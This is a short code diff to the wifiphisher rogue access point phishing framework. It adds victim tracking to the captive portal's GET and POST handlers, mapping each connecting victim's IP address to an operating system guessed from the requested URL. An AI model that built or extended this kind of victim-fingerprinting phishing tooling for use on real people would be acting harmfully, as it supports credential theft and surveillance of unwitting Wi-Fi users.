@@ -10,6 +10,7 @@ import os.path
 import wifiphisher.common.uimethods as uimethods
 import wifiphisher.common.extensions as extensions
 import wifiphisher.common.constants as constants
+import wifiphisher.common.victim as victim
 
 hn = logging.NullHandler()
 hn.setLevel(logging.DEBUG)
@@ -102,6 +103,13 @@ class CaptivePortalHandler(tornado.web.RequestHandler):
         logger.info("GET request from %s for %s", self.request.remote_ip,
                     self.request.full_url())
 
+        # Find the victim object that corresponds to the ip address
+        # And try to Discover OS by requestt
+        victims_instance = victim.Victims.get_instance()
+        victims_instance.associate_victim_ip_to_os(
+            self.request.remote_ip,
+            self.request.full_url())
+
     def post(self):
         """
         Override the post method
@@ -157,6 +165,12 @@ class CaptivePortalHandler(tornado.web.RequestHandler):
         file_path = template_directory + render_file
         self.render(file_path, **template.get_context())
 
+        # Find the victim object that corresponds to the ip address
+        # And try to Discover OS by request
+        victims_instance = victim.Victims.get_instance()
+        victims_instance.associate_victim_ip_to_os(
+            self.request.remote_ip,
+            self.request.full_url())
 
 def runHTTPServer(ip, port, ssl_port, t, em):
     global template
